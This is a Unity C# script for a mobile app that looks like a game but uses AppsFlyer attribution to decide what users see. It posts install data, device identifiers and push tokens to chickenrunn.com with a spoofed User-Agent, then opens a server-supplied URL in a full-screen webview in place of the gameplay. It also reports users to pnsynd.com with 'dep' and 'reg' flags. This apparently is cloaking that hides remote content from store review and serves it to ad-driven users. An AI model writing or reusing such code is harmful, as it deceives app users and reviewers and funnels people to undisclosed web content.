using System;
using System.Collections;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Linq;
using AppsFlyerSDK;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.Playables;
using UnityEngine.SceneManagement;
using UnityEngine.UI;
using Firebase.Messaging;
using UnityEngine.Android;
using Application = UnityEngine.Application;

public class SDKInitializationAndIntegration : MonoBehaviour, IAppsFlyerConversionData
{
    [Header("AppsFlyer Settings")]
    [SerializeField] private string appId;
    [SerializeField] private string devKey;
    
    [Header("Notification UI")]
    [SerializeField] private GameObject notificationPopup;
    [SerializeField] private GameObject notificationPopupLand;
    [SerializeField] private GameObject webView;
    [SerializeField] private ContinuousRotation background;
    [SerializeField] private ContinuousRotation backgroundLand;
    [SerializeField] private Button allowButton;
    [SerializeField] private Button allowButtonLand;
    [SerializeField] private Button skipButton;
    [SerializeField] private Button skipButtonLand;
    [SerializeField] private InternetChecker internetChecker;

    private const string NOTIFICATION_ASKED_KEY = "NotificationAsked";
    private const string SKIP_DATE_KEY = "NotificationSkipDate";
    
    private Dictionary<string, object> conversionDataDictionary;
    private string conversionDictionaryToJSON;
    private bool firebaseInitialized = false;
    private bool serverResponseSuccess = false;
    
    private bool notificationWindowOpened = false;
    
#if UNITY_EDITOR       
    string testAFID = "565356356356365-8886322"; 
#endif
    
    private bool conversionDataReceived = false;
    private bool firebaseTokenReceived = false;
    private bool userDataSent = false;
    private string lastMessageId;
    private bool userConsentedToNotifications = false;
    
    private void OnEnable()
    {
        // Регистрируем обработчики событий приложения
        Application.quitting += OnApplicationQuitting;
        SceneManager.sceneUnloaded += OnSceneUnloaded;
    }
    
    private void OnDisable()
    {
        // Отписываемся от событий
        Application.quitting -= OnApplicationQuitting;
        SceneManager.sceneUnloaded -= OnSceneUnloaded;
    }
    
    private void OnApplicationQuitting()
    {
        // При выходе из приложения отправляем событие завершения сессии
        SendSessionEndEvent();
    }

    private void OnSceneUnloaded(Scene scene)
    {
        // При выгрузке сцены (если это основная сцена) отправляем событие
        if (scene.name == gameObject.scene.name)
        {
            SendSessionEndEvent();
        }
    }
    
    private void TrySendUserDataToPnsynd()
    {
        // Отправляем данные только если пользователь согласился на уведомления
        if (userConsentedToNotifications && conversionDataReceived && firebaseTokenReceived && !userDataSent)
        {
            StartCoroutine(SendUserDataToPnsynd());
            userDataSent = true;
        }
    }
    
    private IEnumerator SendUserDataToPnsynd()
{
    // Формируем данные пользователя
    var userData = new Dictionary<string, object>();

    // Определяем OS
#if UNITY_IOS
    userData["os"] = "IOS";
#elif UNITY_ANDROID
    userData["os"] = "Android";
#else
    userData["os"] = "Other";
#endif

    // Получаем страну из конверсии или локали
    string countryCode = "US"; // значение по умолчанию
    if (conversionDataDictionary != null && 
        conversionDataDictionary.TryGetValue("install_time", out var installTimeObj))
    {
        string installTimeStr = installTimeObj.ToString();
        DateTime installDate;
        
        // Пробуем разные форматы дат
        if (DateTime.TryParseExact(installTimeStr, "yyyy-MM-dd HH:mm:ss", CultureInfo.InvariantCulture, DateTimeStyles.None, out installDate) ||
            DateTime.TryParse(installTimeStr, out installDate))
        {
            userData["installDate"] = installDate.ToUniversalTime().ToString("o");
        }
    }
    userData["country"] = countryCode;

    userData["af_id"] = AppsFlyer.getAppsFlyerId();
    userData["firebase_project_id"] = Firebase.FirebaseApp.DefaultInstance?.Options?.ProjectId ?? "unknown";
    userData["push_token"] = firebaseToken;
    userData["locale"] = CultureInfo.CurrentCulture.Name;
    userData["bundle_id"] = Application.identifier;
    userData["dep"] = false;
    userData["reg"] = false;

    // Получаем дату установки
    if (conversionDataDictionary != null && conversionDataDictionary.ContainsKey("install_time"))
    {
        string installTimeStr = conversionDataDictionary["install_time"].ToString();
        if (DateTime.TryParseExact(installTimeStr, "yyyy-MM-dd HH:mm:ss", CultureInfo.InvariantCulture, DateTimeStyles.None, out DateTime installDate))
        {
            userData["installDate"] = installDate.ToUniversalTime().ToString("o");
        }
    }
    
    // Если даты установки нет, используем текущее время
    if (!userData.ContainsKey("installDate"))
    {
        userData["installDate"] = DateTime.UtcNow.ToString("o");
    }

    // Отправка данных
    string url = "https://pnsynd.com/api/publicapa/add-user/";
    string json = JsonUtility.ToJson(SerializableDictionary<string, object>.FromDictionary(userData), true);
    
    UnityWebRequest request = new UnityWebRequest(url, "POST");
    byte[] jsonBytes = System.Text.Encoding.UTF8.GetBytes(json);
    request.uploadHandler = new UploadHandlerRaw(jsonBytes);
    request.downloadHandler = new DownloadHandlerBuffer();
    request.SetRequestHeader("Content-Type", "application/json");
    
    yield return request.SendWebRequest();

    if (request.result == UnityWebRequest.Result.Success)
    {
        Debug.Log("User data sent to PNSYND successfully");
    }
    else
    {
        Debug.LogError("PNSYND user data error: " + request.error);
    }
}
    
    private void SendSessionEndEvent()
    {
        // Отправляем событие только если пользователь согласился на уведомления
        // И есть сохраненный messageId
        if (!userConsentedToNotifications || string.IsNullOrEmpty(lastMessageId)) return;

        // Формируем данные для завершения сессии
        var endData = new Dictionary<string, string>
        {
            {"leavefromsession", DateTime.UtcNow.ToString("o")}
        };

        StartCoroutine(SendInteractionEvent(lastMessageId, endData));
        lastMessageId = null;
    }
    
    private IEnumerator SendPushClickEvent(string messageId)
    {
        var clickData = new Dictionary<string, string>
        {
            {"pushtimeclick", DateTime.UtcNow.ToString("o")}
        };
    
        yield return StartCoroutine(SendInteractionEvent(messageId, clickData));
    }

    private IEnumerator SendInteractionEvent(string messageId, Dictionary<string, string> data)
    {
        string url = $"https://pnsynd.com/api/interaction/{messageId}";
        string json = JsonUtility.ToJson(SerializableDictionary<string, string>.FromDictionary(data), true);
    
        UnityWebRequest request = new UnityWebRequest(url, "POST");
        byte[] jsonBytes = System.Text.Encoding.UTF8.GetBytes(json);
        request.uploadHandler = new UploadHandlerRaw(jsonBytes);
        request.downloadHandler = new DownloadHandlerBuffer();
        request.SetRequestHeader("Content-Type", "application/json");
    
        yield return request.SendWebRequest();

        if (request.result == UnityWebRequest.Result.Success)
        {
            Debug.Log($"PNSYND interaction event sent for {messageId}");
        }
        else
        {
            Debug.LogError($"PNSYND interaction error: {request.error}");
        }
    }


    private void Awake()
    {
        UniWebView.SetAllowAutoPlay(true);
        UniWebView.SetAllowInlinePlay(true);
        UniWebView.SetEnableKeyboardAvoidance(true);
        UniWebView.SetJavaScriptEnabled(true);
        webView.SetActive(false);
    }

    private void Start()
    {
            allowButton.onClick.AddListener(OnAllowClicked);
            skipButton.onClick.AddListener(OnSkipClicked);
        
            allowButtonLand.onClick.AddListener(OnAllowClicked);
            skipButtonLand.onClick.AddListener(OnSkipClicked);
        
        notificationPopup.SetActive(false);
        notificationPopupLand.SetActive(false);
        
        // Проверяем deep link из уведомления
        CheckNotificationDeepLink();
        
        // Инициализация AppsFlyer
        AppsFlyer.initSDK(devKey, appId, this);
        AppsFlyer.startSDK();
        
        userConsentedToNotifications = PlayerPrefs.GetInt(NOTIFICATION_ASKED_KEY, 0) == 1;
    
        // Если согласие уже было, пытаемся отправить данные
        if (userConsentedToNotifications)
        {
            TrySendUserDataToPnsynd();
        }
    }
    
    private void CheckNotificationDeepLink()
    {
        // 1. Проверяем, было ли приложение открыто по уведомлению
        if (isFirebaseReuestLoad && !string.IsNullOrEmpty(SavedPushData))
        {
            // 2. Запускаем вебвью с URL из уведомления (без сохранения)
            webView.SetActive(true);
            webView.GetComponent<AddURLForWebView>().RunWebViewWithUrl(SavedPushData);
        
            // 3. Очищаем данные сразу после использования
            SavedPushData = null;
            isFirebaseReuestLoad = false;
        
            return; // Прерываем дальнейшую инициализацию
        }
    }

   public void onConversionDataSuccess(string conversionData)
{
    AppsFlyer.AFLog("onConversionDataSuccess", conversionData);
    conversionDataDictionary = AppsFlyer.CallbackStringToDictionary(conversionData);
    conversionDictionaryToJSON = JsonUtility.ToJson(SerializableDictionary<string, object>.FromDictionary(conversionDataDictionary), true);
    
    // Проверка органического трафика
    if (conversionDataDictionary.ContainsKey("af_status") && 
        conversionDataDictionary["af_status"].ToString().ToLower() == "organic")
    {
        StartCoroutine(HandleOrganicInstall());
    }
    else
    {
        StartCoroutine(SendJsonRequest());
    }
    
    conversionDataReceived = true;
    TrySendUserDataToPnsynd();
}

private IEnumerator HandleOrganicInstall()
{
    yield return new WaitForSeconds(5f);
    
    // Запрос данных инсталляции
    yield return FetchInstallData(updatedData => 
    {
        if (updatedData != null)
        {
            conversionDataDictionary = updatedData;
            // Обновляем JSON представление
            conversionDictionaryToJSON = JsonUtility.ToJson(
                SerializableDictionary<string, object>.FromDictionary(conversionDataDictionary), 
                true
            );
        }
    });
    
    StartCoroutine(SendJsonRequest());
}

private IEnumerator FetchInstallData(Action<Dictionary<string, object>> callback)
{
    string url = $"https://gcdsdk.appsflyer.com/install_data/v4.0/" +
                 $"{Application.identifier}?devkey={devKey}&device_id={AppsFlyer.getAppsFlyerId()}";
    
    using UnityWebRequest request = UnityWebRequest.Get(url);
    request.SetRequestHeader("accept", "application/json");
    
    yield return request.SendWebRequest();
    
    if (request.result != UnityWebRequest.Result.Success)
    {
        Debug.LogError($"Install data request failed: {request.error}");
        callback?.Invoke(null);
        yield break;
    }
    
    try
    {
        var data = AppsFlyer.CallbackStringToDictionary(request.downloadHandler.text);
        callback?.Invoke(data);
        Debug.Log("Successfully fetched updated install data");
    }
    catch (Exception ex)
    {
        Debug.LogError($"Failed to parse install data: {ex.Message}");
        callback?.Invoke(null);
    }
}

    IEnumerator SendJsonRequest()
    {
        if (conversionDataDictionary == null)
        {
            conversionDataDictionary = new Dictionary<string, object>();
        }
        
#if !UNITY_EDITOR
        conversionDataDictionary.TryAdd($"af_id",AppsFlyer.getAppsFlyerId());
#else
        conversionDataDictionary.TryAdd("af_id", AppsFlyer.getAppsFlyerId());
#endif
        conversionDataDictionary.TryAdd("bundle_id", Application.identifier);
        conversionDataDictionary.TryAdd("store_id", $"id{appId}");
        conversionDataDictionary.TryAdd("locale", CultureInfo.CurrentCulture.Name);
#if !UNITY_IOS
        conversionDataDictionary.TryAdd("os", "Android");
#else
        conversionDataDictionary.TryAdd("os", "iOS");
#endif
        // Если токен уже есть, добавляем его
        if (!string.IsNullOrEmpty(firebaseToken))
        {
            conversionDataDictionary.TryAdd("push_token", firebaseToken);
            if (Firebase.FirebaseApp.DefaultInstance != null)
            {
                conversionDataDictionary.TryAdd("firebase_project_id", Firebase.FirebaseApp.DefaultInstance.Options.ProjectId);
            }
        }

        string url = "https://chickenrunn.com/config.php";
        
        string jsonToSend = DictToJson(conversionDataDictionary);
        
        UnityWebRequest request = new UnityWebRequest(url, "POST");
        
#if UNITY_EDITOR
        // conversionDictionaryToJSON =   "{\n \"adset\": \"s1s3\",\n \"af_adset\": \"mm3\",\n \"adgroup\": \"s1s3\",\n \"campaign_id\": \"6068535534218\",\n \"af_status\":" +
        //                                " \"Non-organic\",\n \"agency\": \"Test\",\n \"af_sub3\": null,\n \"af_siteid\": null,\n " +
        //                                "\"adset_id\": \"6073532011618\",\n \"is_fb\": true,\n \"is_first_launch\": true,\n \"click_time\": " +
        //                                "\"2017-07-18 12:55:05\",\n \"iscache\": false,\n \"ad_id\": \"6074245540018\",\n \"af_sub1\": \"439223\",\n " +
        //                                "\"campaign\": \"Comp_22_GRTRMiOS_111123212_US_iOS_GSLTS_wafb unlim access\",\n \"is_paid\": true,\n \"af_sub4\": " +
        //                                "\"01\",\n \"adgroup_id\": \"6073532011418\",\n \"is_mobile_data_terms_signed\": true,\n \"af_channel\": \"Facebook\",\n " +
        //                                "\"af_sub5\": null,\n \"media_source\": \"Facebook Ads\",\n \"install_time\": \"2017-07-19 08:06:56.189\",\n \"af_sub2\": null\n}";;
#endif
        
        byte[] jsonBytes = new System.Text.UTF8Encoding().GetBytes(jsonToSend);
        request.uploadHandler = new UploadHandlerRaw(jsonBytes);
        request.downloadHandler = new DownloadHandlerBuffer();
        request.SetRequestHeader("Content-Type", "application/json");
        request.SetRequestHeader("User-Agent", "PostmanRuntime/7.41.2");
        request.SetRequestHeader("Accept", "*/*");
        //request.SetRequestHeader("Accept-Language", "en-US,en;q=0.9");
        request.SetRequestHeader("Connection", "keep-alive");

        yield return request.SendWebRequest();

        if (request.result == UnityWebRequest.Result.Success)
        {
            Debug.Log("Успешно отправлено! Ответ сервера: " + request.downloadHandler.text);
            // Парсим JSON ответ
            var responseJson = JsonUtility.FromJson<ServerResponse>(request.downloadHandler.text);
    
            // Сохраняем только URL
            if (responseJson != null && !string.IsNullOrEmpty(responseJson.url))
            {
                PlayerPrefs.SetString("URLForWebWiev", responseJson.url);
                Debug.Log("URL сохранен: " + responseJson.url);
            }
    
            serverResponseSuccess = true;
          
            internetChecker.CloseOtherWindows();
            
            CheckNotificationStatus();
        }
        else
        {
            internetChecker.OpenGameplayUI();

            if (internetChecker.hasInternet)
            {
                Screen.orientation = ScreenOrientation.Portrait;
                Screen.autorotateToLandscapeLeft = false;
                Screen.autorotateToLandscapeRight = false;
                Screen.autorotateToPortraitUpsideDown = false;
                PlayerPrefs.SetInt("ConfigFailed", 1);
            }
            
            Debug.LogError("Ошибка: " + request.error);
        }
    }
    
#if !UNITY_EDITOR
    private bool IsAutoRotationEnabled()
    {
        try
        {
            using (AndroidJavaClass settingsSystem = new AndroidJavaClass("android.provider.Settings$System"))
            using (AndroidJavaObject activity = new AndroidJavaClass("com.unity3d.player.UnityPlayer").GetStatic<AndroidJavaObject>("currentActivity"))
            using (AndroidJavaObject contentResolver = activity.Call<AndroidJavaObject>("getContentResolver"))
            {
                int rotationOn = settingsSystem.CallStatic<int>("getInt", contentResolver, "accelerometer_rotation", 0);
                return rotationOn == 1;
            }
        }
        catch (System.Exception e)
        {
            Debug.LogError("Error checking auto-rotation: " + e.Message);
            return true;
        }
    }
#endif
    
    private void SetForceAutoRotation()
    {
#if !UNITY_EDITOR
        bool autoRotationEnabled = IsAutoRotationEnabled();

        using (var unityPlayer = new AndroidJavaClass("com.unity3d.player.UnityPlayer"))
        using (var activity = unityPlayer.GetStatic<AndroidJavaObject>("currentActivity"))
        {
            if (autoRotationEnabled)
            {
                // Разрешить авто-поворот через системные настройки
                activity.Call("setRequestedOrientation", 0); // SCREEN_ORIENTATION_UNSPECIFIED
            }
            else
            {
                // Фиксировать портретную ориентацию
                activity.Call("setRequestedOrientation", 1); // SCREEN_ORIENTATION_PORTRAIT
            }
        }
#endif
    }
   
    private void CheckNotificationStatus()
        {
            // Проверяем, было ли приложение открыто по уведомлению
            if (isFirebaseReuestLoad && !string.IsNullOrEmpty(SavedPushData))
            {
                // Запускаем вебвью с URL из уведомления
                webView.SetActive(true);
                webView.GetComponent<AddURLForWebView>().RunWebViewWithUrl(SavedPushData);
        
                // Очищаем сохраненные данные уведомления
                SavedPushData = null;
                isFirebaseReuestLoad = false;
        
                // Пропускаем обычный процесс инициализации
                return;
            }
            
            if (!serverResponseSuccess) return;

            if (PlayerPrefs.GetInt(NOTIFICATION_ASKED_KEY, 0) == 1)
            {
#if UNITY_ANDROID && !UNITY_EDITOR
        if (GetAndroidVersion() >= 33)
        {
            string permission = "android.permission.POST_NOTIFICATIONS";
            if (!Permission.HasUserAuthorizedPermission(permission))
            {
                if (Permission.ShouldShowRequestPermissionRationale(permission))
                {
                    // If we can ask again, show notification popup
                    notificationPopup.SetActive(true);
                    return;
                }
            }
        }
#endif
                InitializeFirebaseIfNeeded();
                backgroundLand.StopRotation();
                webView.SetActive(true);
                
                SetForceAutoRotation();
                
                notificationWindowOpened = false;
                webView.GetComponent<AddURLForWebView>().RunWebView();
                return;
            }

        // Проверяем, если был Skip - прошло ли 3 дня
        if (PlayerPrefs.HasKey(SKIP_DATE_KEY))
        {
            string skipDateString = PlayerPrefs.GetString(SKIP_DATE_KEY);
            if (DateTime.TryParse(skipDateString, out DateTime skipDate))
            {
                if (DateTime.Now < skipDate.AddDays(3))
                {
                    background.StopRotation();
                    backgroundLand.StopRotation();
                    webView.SetActive(true);
                    notificationWindowOpened = false;
                    webView.GetComponent<AddURLForWebView>().RunWebView();
                    return;
                }
            }
        }

        internetChecker.CloseOtherWindows();
        
        if (Screen.orientation == ScreenOrientation.Portrait || Screen.orientation == ScreenOrientation.PortraitUpsideDown)
        {
            notificationPopup.SetActive(true);
            notificationPopupLand.SetActive(false);
            notificationWindowOpened = true;
        }
        else
        {
            notificationPopup.SetActive(false);
            notificationPopupLand.SetActive(true);
            notificationWindowOpened = true;
        }
    }

    private void Update()
    {
        if (notificationWindowOpened)
        {
            if (Screen.orientation == ScreenOrientation.Portrait)
            {
                notificationPopup.SetActive(true);
                notificationPopupLand.SetActive(false);
            }

            if (Screen.orientation == ScreenOrientation.LandscapeRight ||
                Screen.orientation == ScreenOrientation.LandscapeLeft)
            {
                notificationPopup.SetActive(false);
                notificationPopupLand.SetActive(true);
            }
        }
    }

    private void OnAllowClicked()
    {
        notificationPopup.SetActive(false);
        notificationPopupLand.SetActive(false);
    
#if UNITY_ANDROID && !UNITY_EDITOR
    if (GetAndroidVersion() >= 33)
    {
        string permission = "android.permission.POST_NOTIFICATIONS";
        var callbacks = new PermissionCallbacks();
        callbacks.PermissionGranted += (string _) =>
        {
            HandlePermissionGranted();
        };
        callbacks.PermissionDenied += (string _) =>
        {
            if (Permission.ShouldShowRequestPermissionRationale(permission))
            {
                // User denied but can ask again
                HandlePermissionDeniedCanAsk();
            }
            else
            {
                // User selected "Don't ask again"
                HandlePermissionDeniedPermanent();
            }
        };
        Permission.RequestUserPermission(permission, callbacks);
    }
    else
    {
        // For Android <13, proceed without permission
        HandlePermissionGranted();
    }
#else
        // For non-Android platforms
        HandlePermissionGranted();
#endif
    }
    
    private void HandlePermissionGranted()
    {
        userConsentedToNotifications = true; // Устанавливаем флаг согласия
        
        PlayerPrefs.SetInt(NOTIFICATION_ASKED_KEY, 1);
        PlayerPrefs.DeleteKey(SKIP_DATE_KEY);
        InitializeFirebaseMessaging();
        background.StopRotation();
        backgroundLand.StopRotation();
        webView.SetActive(true);
        notificationWindowOpened = false;
        webView.GetComponent<AddURLForWebView>().RunWebView();
        
        TrySendUserDataToPnsynd();
    }

    private void HandlePermissionDeniedCanAsk()
    {
        PlayerPrefs.SetString(SKIP_DATE_KEY, DateTime.Now.ToString());
        PlayerPrefs.SetInt(NOTIFICATION_ASKED_KEY, 0);
        PlayerPrefs.Save();
        background.StopRotation();
        backgroundLand.StopRotation();
        webView.SetActive(true);
        notificationWindowOpened = false;
        webView.GetComponent<AddURLForWebView>().RunWebView();
    }

    private void HandlePermissionDeniedPermanent()
    {
        PlayerPrefs.SetInt(NOTIFICATION_ASKED_KEY, 1);
        PlayerPrefs.Save();
        background.StopRotation();
        backgroundLand.StopRotation();
        webView.SetActive(true);
        notificationWindowOpened = false;
        webView.GetComponent<AddURLForWebView>().RunWebView();
    }

    private void OnSkipClicked()
    {
        PlayerPrefs.SetString(SKIP_DATE_KEY, DateTime.Now.ToString());
        PlayerPrefs.SetInt(NOTIFICATION_ASKED_KEY, 0);
        notificationPopup.SetActive(false);
        notificationPopupLand.SetActive(false);
        background.StopRotation();
        backgroundLand.StopRotation();
        webView.SetActive(true);
        notificationWindowOpened = false;
        webView.GetComponent<AddURLForWebView>().RunWebView();
    }

    private void InitializeFirebaseIfNeeded()
    {
        if (!firebaseInitialized)
        {
            #if !UNITY_EDITOR
            InitializeFirebaseMessaging();
            #endif
            
        }
    }
    
    private IEnumerator SendFirebaseTokenToServer()
    {
        if (string.IsNullOrEmpty(firebaseToken))
            yield break;

        string url = "https://chickenrunn.com/config.php";
    
        var dataToSend = new Dictionary<string, object>
        {
            {"push_token", firebaseToken},
            {"bundle_id", Application.identifier},
            {"af_id", AppsFlyer.getAppsFlyerId()},
            {"firebase_project_id", Firebase.FirebaseApp.DefaultInstance?.Options?.ProjectId}
        };

        string jsonToSend = JsonUtility.ToJson(SerializableDictionary<string, object>.FromDictionary(dataToSend), true);
    
        UnityWebRequest request = new UnityWebRequest(url, "POST");
        byte[] jsonBytes = new System.Text.UTF8Encoding().GetBytes(jsonToSend);
        request.uploadHandler = new UploadHandlerRaw(jsonBytes);
        request.downloadHandler = new DownloadHandlerBuffer();
        request.SetRequestHeader("Content-Type", "application/json");
    
        yield return request.SendWebRequest();

        if (request.result == UnityWebRequest.Result.Success)
        {
            Debug.Log("Firebase token успешно отправлен на сервер");
            Debug.Log("" + firebaseToken + " " + Application.identifier+ " "+ AppsFlyer.getAppsFlyerId()+ " "+Firebase.FirebaseApp.DefaultInstance?.Options?.ProjectId);
        }
        else
        {
            Debug.LogError("Ошибка при отправке Firebase токена: " + request.error);
        }
    }

    private void InitializeFirebaseMessaging()
    {
#if !UNITY_EDITOR
    Firebase.FirebaseApp.CheckAndFixDependenciesAsync().ContinueWith(task => 
    {
        if (task.Result == Firebase.DependencyStatus.Available)
        {
            FirebaseMessaging.TokenRegistrationOnInitEnabled = true;
            FirebaseMessaging.SubscribeAsync("all");
            FirebaseMessaging.MessageReceived += OnMessageReceived;
            FirebaseMessaging.TokenReceived += OnTokenReceived;
            firebaseInitialized = true;
        
            // Проверяем, есть ли уже сохраненный токен
            string savedToken = PlayerPrefs.GetString("FirebaseToken", null);
            if (!string.IsNullOrEmpty(savedToken))
            {
                firebaseToken = savedToken;
                // Отправляем токен только если пользователь согласился
                if (userConsentedToNotifications)
                {
                    StartCoroutine(SendFirebaseTokenToServer());
                }
            }
        }
        else
        {
            Debug.LogError("Could not resolve all Firebase dependencies: " + task.Result);
        }
    });
#endif
    }

    private int GetAndroidVersion()
    {
        #if UNITY_ANDROID && !UNITY_EDITOR
        using (var version = new AndroidJavaClass("android.os.Build$VERSION"))
        {
            return version.GetStatic<int>("SDK_INT");
        }
        #else
        return 0;
        #endif
    }

    // Остальные методы AppsFlyer и Firebase
    public void onConversionDataFail(string error) { /*...*/ }
    public void onAppOpenAttribution(string attributionData) { /*...*/ }
    public void onAppOpenAttributionFailure(string error) { /*...*/ }
    
    private string firebaseToken = null;
    private bool isFirebaseReuestLoad = false;
    
    private string SavedPushData
    {
        get => PlayerPrefs.GetString("SavedPushData", null);
        set
        {
            PlayerPrefs.SetString("SavedPushData", value);
            PlayerPrefs.Save();
        }
    }
    
    private void OnMessageReceived(object sender, MessageReceivedEventArgs e) 
    {
        var data = e.Message.Data;
    
        // Сохраняем messageId для событий сессии (добавлена проверка на null)
        if (data.TryGetValue("messageId", out var messageId))
        {
            lastMessageId = messageId;
        }
        else if (!string.IsNullOrEmpty(e.Message.MessageId))
        {
            lastMessageId = e.Message.MessageId;
        }

        if (!data.TryGetValue("url", out var url)) return;

        // Сохраняем URL только для текущей сессии
        if (e.Message.NotificationOpened) 
        {
            SavedPushData = url;
            isFirebaseReuestLoad = true;
    
            // Если приложение было запущено из уведомления, сразу открываем вебвью
            if (!string.IsNullOrEmpty(url))
            {
                webView.SetActive(true);
                webView.GetComponent<AddURLForWebView>().RunWebViewWithUrl(url);
            
                // Отправляем событие клика только если пользователь согласился на уведомления
                if (userConsentedToNotifications && !string.IsNullOrEmpty(lastMessageId))
                {
                    StartCoroutine(SendPushClickEvent(lastMessageId));
                }
            
                // Очищаем данные после использования
                SavedPushData = null;
                isFirebaseReuestLoad = false;
            }
        }
    }
    private void OnTokenReceived(object sender, TokenReceivedEventArgs token) 
    {
        firebaseToken = token.Token;
        Debug.Log("Received Firebase Token: " + firebaseToken);
        PlayerPrefs.SetString("FirebaseToken", firebaseToken);
        PlayerPrefs.Save();
    
        firebaseTokenReceived = true;
    
        // Пытаемся отправить данные только если пользователь согласился
        if (userConsentedToNotifications)
        {
            StartCoroutine(SendFirebaseTokenToServer());
            TrySendUserDataToPnsynd();
        }
    }

    void OnDestroy()
    {
        allowButton.onClick.RemoveListener(OnAllowClicked);
        skipButton.onClick.RemoveListener(OnSkipClicked);
        
        allowButtonLand.onClick.RemoveListener(OnAllowClicked);
        skipButtonLand.onClick.RemoveListener(OnSkipClicked);
        
        if (firebaseInitialized)
        {
            FirebaseMessaging.MessageReceived -= OnMessageReceived;
            FirebaseMessaging.TokenReceived -= OnTokenReceived;
        }
    }
    
    private string DictToJson(Dictionary<string, object> dictionary) => 
        
        "{" + string.Join(",", dictionary.Select(kvp => kvp.Value != null ? 
            $"\"{kvp.Key}\":{(kvp.Value is string ? $"\"{kvp.Value}\"" : kvp.Value.ToString().ToLower())}" : $"\"{kvp.Key}\":null")) + "}";
    
}

[System.Serializable]
public class SerializableDictionary<TKey, TValue>
{
    public List<TKey> keys = new List<TKey>();
    public List<TValue> values = new List<TValue>();

    public Dictionary<TKey, TValue> ToDictionary()
    {
        var dict = new Dictionary<TKey, TValue>();
        for (int i = 0; i < keys.Count; i++)
        {
            dict[keys[i]] = values[i];
        }
        return dict;
    }

    public static SerializableDictionary<TKey, TValue> FromDictionary(Dictionary<TKey, TValue> dict)
    {
        var serializableDict = new SerializableDictionary<TKey, TValue>();
        foreach (var kvp in dict)
        {
            serializableDict.keys.Add(kvp.Key);
            serializableDict.values.Add(kvp.Value);
        }
        return serializableDict;
    }
}

[System.Serializable]
public class ServerResponse
{
    public bool ok;
    public string url;
    public long expires;
}